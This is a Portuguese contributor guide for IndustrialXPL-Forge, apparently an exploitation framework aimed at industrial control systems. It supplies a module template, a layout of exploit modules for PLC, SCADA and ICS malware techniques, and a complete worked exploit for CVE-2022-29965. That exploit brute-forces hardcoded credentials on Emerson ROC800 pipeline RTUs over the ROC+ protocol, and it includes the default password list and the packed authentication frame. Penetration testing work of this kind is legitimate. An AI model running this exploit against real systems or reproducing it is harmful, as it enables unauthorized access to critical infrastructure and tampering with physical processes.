# Desenvolvimento de Módulos

Este guia cobre tudo que é necessário para escrever um novo módulo IXF: o template mínimo, exemplos completos e o fluxo de contribuição.

---

## Template Mínimo

Copie este template e preencha os placeholders:

```python
"""IXF NOME_MODULO — breve descrição. simulate=True padrão."""
import socket

from industrialxpl.core.exploit import (
    Exploit, OptBool, OptIP, OptPort, mute,
    print_error, print_status, DestructiveGate,
)


class Exploit(Exploit):
    __info__ = {
        "name":             "Nome do Módulo",
        "description":      "Descrição em uma linha.",
        "authors":          ("Seu Nome",),
        "references":       ("https://url-do-aviso.com",),
        "devices":          ("Vendor Produto",),
        "impact":           "HIGH",
        "exploit_type":     "Credenciais Padrão",
        "cve":              "CVE-YYYY-NNNNN",  # ou "N/A"
        "cvss":             "9.8",
        "severity":         "CRITICAL",
        "mitre_techniques": ["T0866"],
        "mitre_tactics":    ["Initial Access"],
    }

    target      = OptIP("",    "IP do dispositivo alvo")
    port        = OptPort(502, "Porta do protocolo")
    simulate    = OptBool(True,  "Modo simulação (padrão: True)")
    destructive = OptBool(False, "Habilitar exploração ao vivo")

    @mute
    def check(self) -> bool:
        if not self.target:
            return False
        try:
            s = socket.socket()
            s.settimeout(5)
            s.connect((self.target, self.port))
            s.close()
            return True
        except Exception:
            return False

    def run(self) -> None:
        if not self.target:
            print_error("Defina a opção 'target' primeiro.")
            return
        if self.simulate:
            DestructiveGate.print_simulation(
                description=(
                    "CVE-YYYY-NNNNN Vendor Produto\n"
                    "Passo 1: Conectar ao alvo\n"
                    "Passo 2: Enviar payload de exploit\n"
                    "Passo 3: Alcançar objetivo de exploração"
                ),
                mitre_techniques=["T0866"],
            )
            return
        print_status("[CVE-YYYY] Explorando {}:{}...".format(self.target, self.port))
        # Código de exploit ao vivo aqui
```

---

## Posicionamento do Arquivo

| Tipo de Módulo | Padrão de Diretório | Exemplo |
|----------------|--------------------|---------| 
| Exploit CVE | `cve/<vendor>/cve_YYYY_NNNNN_<desc>.py` | `cve/siemens/cve_2021_22681_s7_1200_hardcoded_key.py` |
| Abuso de protocolo | `exploits/protocols/<protocolo>/<nome>.py` | `exploits/protocols/modbus/modbus_replay_attack.py` |
| Exploit PLC | `exploits/plc/<vendor>/<nome>.py` | `exploits/plc/siemens/siprotec4_dos.py` |
| Exploit SCADA | `exploits/scada/<vendor>/<nome>.py` | `exploits/scada/schneider/citect_scada_odbc_rce.py` |
| Scanner | `scanners/ics/<protocolo>_scan.py` | `scanners/ics/modbus_detect.py` |
| Credenciais padrão | `creds/<vendor>/<protocolo>_default_creds.py` | `creds/siemens/ssh_default_creds.py` |
| TTP de malware | `cve/malware/<nome>.py` | `cve/malware/frostygoop_modbus_heating.py` |
| Assessment | `assessment/<categoria>/<nome>.py` | `assessment/mitre_ics/t0843_program_upload.py` |

**Também crie `__init__.py`** em qualquer novo diretório:

```bash
touch industrialxpl/modules/cve/meuvendor/__init__.py
```

---

## Exemplo Completo Anotado

```python
"""IXF CVE-2022-29965 — Emerson ROC800 RTU Hardcoded Credentials.

CVSS: 9.8 (CRITICAL) | CWE: CWE-798

RTUs Emerson ROC800 usadas em medição de gasodutos contêm
credenciais hardcoded que permitem acesso total ao protocolo ROC+.
"""
import socket, struct

from industrialxpl.core.exploit import (
    Exploit, OptBool, OptIP, OptPort, mute,
    print_error, print_status, print_success, print_table, DestructiveGate,
)


class Exploit(Exploit):
    __info__ = {
        "name": "CVE-2022-29965 Emerson ROC800 RTU Hardcoded Credentials",
        "description": (
            "RTUs Emerson ROC800 usadas em medição de petróleo e gás contêm "
            "credenciais hardcoded no protocolo ROC+. Qualquer dispositivo na rede "
            "pode autenticar sem autorização e ler/escrever todos os dados do RTU."
        ),
        "authors": ("Andre Henrique (mrhenrike)",),
        "references": ("https://www.cisa.gov/uscert/ics/advisories/icsa-22-200-03",),
        "devices": ("Emerson ROC800 Series RTU",),
        "impact": "CRITICAL",
        "exploit_type": "Credenciais Hardcoded",
        "cve": "CVE-2022-29965",
        "cvss": "9.8",
        "severity": "CRITICAL",
        "mitre_techniques": ["T0859", "T0813"],
        "mitre_tactics": ["Credential Access"],
    }

    target      = OptIP("",   "IP do RTU Emerson ROC800")
    port        = OptPort(4000, "Porta do protocolo ROC+ (padrão: 4000)")
    simulate    = OptBool(True,  "Simulação (padrão: True)")
    destructive = OptBool(False, "Exploração ao vivo — requer autorização")

    ROC_DEFAULT_CREDS = [("admin", "ROC800"), ("", ""), ("operator", "op")]

    @mute
    def check(self) -> bool:
        if not self.target:
            return False
        try:
            s = socket.socket()
            s.settimeout(5)
            s.connect((self.target, self.port))
            s.close()
            return True
        except Exception:
            return False

    def run(self) -> None:
        if not self.target:
            print_error("Defina 'target'.")
            return
        if self.simulate:
            DestructiveGate.print_simulation(
                description=(
                    "CVE-2022-29965 Emerson ROC800 Credenciais Hardcoded\n\n"
                    "Passo 1: Conectar ao ROC800 na porta 4000 (protocolo ROC+)\n"
                    "Passo 2: Autenticar com credenciais hardcoded\n"
                    "Passo 3: Ler todos os I/O e configuração do RTU\n"
                    "Passo 4: Escrever setpoints de processo ou exfiltrar dados"
                ),
                mitre_techniques=["T0859", "T0813"],
            )
            return

        results = []
        for user, pwd in self.ROC_DEFAULT_CREDS:
            try:
                s = socket.socket(); s.settimeout(5)
                s.connect((self.target, self.port))
                auth = struct.pack(">BB16s16s", 0x10, 0x01,
                                   user.encode().ljust(16, b'\x00'),
                                   pwd.encode().ljust(16, b'\x00'))
                s.send(auth)
                resp = s.recv(8); s.close()
                status = "SUCESSO" if (resp and resp[2] == 0x00) else "FALHOU"
                results.append((user or "(vazio)", pwd or "(vazio)", status))
                if status == "SUCESSO":
                    print_success("[+] Credenciais válidas: '{}' / '{}'".format(user, pwd))
            except Exception as e:
                results.append((user or "(vazio)", pwd or "(vazio)", "ERRO"))
        if results:
            print_table(["Usuário", "Senha", "Resultado"], results)
```

---

## Checklist de Contribuição

Antes de enviar um módulo, verifique:

- [ ] `simulate=True` é o padrão
- [ ] `check()` está decorado com `@mute` e retorna `bool`
- [ ] `run()` chama `DestructiveGate.print_simulation()` quando `simulate=True`
- [ ] `__info__` tem todas as chaves obrigatórias
- [ ] Nível de impacto reflete com precisão o risco
- [ ] Sem credenciais, tokens ou secrets no código-fonte
- [ ] Referências apontam para advisories públicos reais

---

## Validar Seu Módulo

```bash
python -c "
from industrialxpl.core.exploit.utils import index_modules, import_exploit
mods = index_modules()
errs = []
for m in mods:
    try:
        import_exploit('industrialxpl.modules.' + m)()
    except Exception as e:
        errs.append((m, str(e)))
print(f'{len(mods)} módulos | {len(errs)} erros')
if errs:
    for m, e in errs: print(f'  ERR {m}: {e}')
"
```

---

## Enviando um Pull Request

1. Fork [github.com/mrhenrike/IndustrialXPL-Forge](https://github.com/mrhenrike/IndustrialXPL-Forge)
2. Criar branch: `git checkout -b add-cve-YYYY-NNNNN`
3. Adicionar módulo no caminho correto
4. Executar o comando de validação acima
5. Enviar PR com descrição clara

Veja [CONTRIBUTING.md](../../CONTRIBUTING.md) para as diretrizes completas.

---

*Anterior: [Protocolos e Vendors](08-protocolos-vendors.md) | Próximo: [CLI Não-Interativo](10-cli-nao-interativo.md)*
